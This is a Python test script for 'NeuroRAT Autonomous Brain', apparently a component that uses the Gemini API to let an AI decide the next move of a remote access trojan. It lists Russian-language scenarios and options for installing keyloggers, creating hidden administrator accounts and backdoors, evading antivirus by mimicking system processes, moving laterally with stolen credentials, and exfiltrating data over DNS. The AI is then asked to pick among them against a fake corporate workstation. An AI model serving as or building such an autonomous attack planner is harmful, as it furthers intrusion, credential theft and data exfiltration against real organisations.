#!/usr/bin/env python3
"""
Test NeuroRAT Autonomous Brain with Gemini API integration
"""

import os
import sys
import json
import logging
import argparse
from typing import List, Dict, Any

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger("brain-test")

# Import the AutonomousBrain
try:
    from autonomous_brain import AutonomousBrain
    HAS_BRAIN = True
except ImportError:
    HAS_BRAIN = False
    logger.error("Cannot import AutonomousBrain - make sure you are in the right directory")
    sys.exit(1)

def test_decision_making(scenario: str, verbose: bool = False, use_api: bool = True):
    """
    Test the brain's decision making capability with a test scenario
    
    Args:
        scenario: The test scenario to use
        verbose: Enable verbose logging
        use_api: Use Gemini API instead of local model
    """
    # Initialize the brain
    brain = AutonomousBrain(
        system_profile="balanced",
        max_memory_mb=512,
        use_api=use_api,
        verbose=verbose
    )
    
    # Test scenarios
    scenarios = {
        "data_collection": {
            "situation": "Обнаружена система с потенциально ценными данными. Администратор отошел, оставив сессию открытой.",
            "options": [
                "Быстро собрать видимые файлы с рабочего стола",
                "Установить кейлоггер для сбора паролей",
                "Сделать скриншот экрана и исследовать открытые окна",
                "Исследовать сетевые соединения в поисках других систем",
                "Не предпринимать активных действий и продолжить наблюдение"
            ]
        },
        "defense_evasion": {
            "situation": "Обнаружена активность антивируса. Система начала сканирование процессов.",
            "options": [
                "Немедленно прекратить все активные операции",
                "Переместить критические файлы в другое место",
                "Имитировать легитимный системный процесс",
                "Создать отвлекающую активность в другой части системы",
                "Временно остановить работу и ждать окончания сканирования"
            ]
        },
        "persistence": {
            "situation": "Получен доступ к ценной системе. Требуется обеспечить долговременный доступ.",
            "options": [
                "Создать скрытую учетную запись администратора",
                "Внедрить загрузчик в автозагрузку",
                "Модифицировать системную службу для запуска вредоносного кода",
                "Установить бэкдор в редко используемом системном компоненте",
                "Создать задачу по расписанию для периодического подключения"
            ]
        },
        "lateral_movement": {
            "situation": "Обнаружена сеть с несколькими системами. Требуется расширить доступ.",
            "options": [
                "Использовать учетные данные с текущей системы для доступа к другим машинам",
                "Провести сканирование сети на наличие уязвимостей",
                "Эксплуатировать известные уязвимости в сетевых службах",
                "Отслеживать сетевой трафик для перехвата учетных данных",
                "Установить прокси для перенаправления атак через скомпрометированную систему"
            ]
        },
        "data_exfiltration": {
            "situation": "Найдены ценные данные, которые необходимо извлечь из системы.",
            "options": [
                "Сжать и зашифровать данные перед отправкой",
                "Разбить данные на мелкие части и отправлять постепенно",
                "Использовать скрытый канал через DNS-запросы",
                "Выгрузить данные в легитимный облачный сервис",
                "Дождаться периода низкой активности и отправить все одним пакетом"
            ]
        }
    }
    
    # Check if the scenario exists
    if scenario not in scenarios:
        logger.error(f"Unknown scenario: {scenario}")
        logger.info(f"Available scenarios: {', '.join(scenarios.keys())}")
        return
    
    # Get the scenario details
    situation = scenarios[scenario]["situation"]
    options = scenarios[scenario]["options"]
    
    # Fake system info
    system_info = {
        "os": "Windows 10 Enterprise",
        "hostname": "CORP-WORKSTATION",
        "username": "john.smith",
        "ip": "192.168.1.105",
        "domain": "example.corp"
    }
    
    # Make a decision
    logger.info(f"Testing scenario: {scenario}")
    logger.info(f"Situation: {situation}")
    logger.info(f"Options:")
    for i, option in enumerate(options):
        logger.info(f"  {i+1}. {option}")
    
    # Let the brain decide
    decision = brain.decide_action(
        situation=situation,
        options=options,
        system_info=system_info,
        urgency=0.6
    )
    
    # Print the decision
    logger.info("\nBrain decision:")
    logger.info(f"Chosen action: {decision['action']}")
    logger.info(f"Reasoning: {decision['reasoning']}")
    logger.info(f"Next steps: {decision.get('next_steps', 'N/A')}")
    logger.info(f"Method: {decision.get('method', 'N/A')}")
    logger.info(f"Confidence: {decision.get('confidence', 0.0)}")
    
    return decision

def main():
    """Main function"""
    parser = argparse.ArgumentParser(description="Test NeuroRAT Autonomous Brain")
    parser.add_argument("--scenario", type=str, default="data_collection",
                        help="Test scenario to use")
    parser.add_argument("--verbose", action="store_true", help="Enable verbose logging")
    parser.add_argument("--no-api", action="store_true", help="Don't use Gemini API")
    
    args = parser.parse_args()
    
    test_decision_making(args.scenario, args.verbose, not args.no_api)

if __name__ == "__main__":
    main() 